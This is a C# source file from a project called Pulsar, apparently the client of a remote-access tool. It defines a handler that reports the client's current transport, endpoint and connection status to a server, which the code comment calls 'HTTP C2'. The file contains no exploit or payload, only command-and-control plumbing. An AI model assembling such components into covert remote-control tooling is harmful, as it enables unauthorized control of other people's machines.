using Pulsar.Client.Networking;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring;
using Pulsar.Common.Networking;

namespace Pulsar.Client.Messages
{
    /// <summary>
    /// Handles transport info requests so the server can see whether HTTP C2 is active.
    /// </summary>
    public class HttpTransportInfoHandler : IMessageProcessor
    {
        private readonly PulsarClient _client;

        public HttpTransportInfoHandler(PulsarClient client)
        {
            _client = client;
        }

        public bool CanExecute(IMessage message) => message is HttpTransportInfoRequest;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case HttpTransportInfoRequest request:
                    Execute(sender, request);
                    break;
            }
        }

        private void Execute(ISender client, HttpTransportInfoRequest _)
        {
            var response = new HttpTransportInfoResponse
            {
                Transport = _client.CurrentTransport,
                Endpoint = _client.CurrentEndpoint,
                Connected = _client.Connected
            };

            client.Send(response);
        }
    }
}
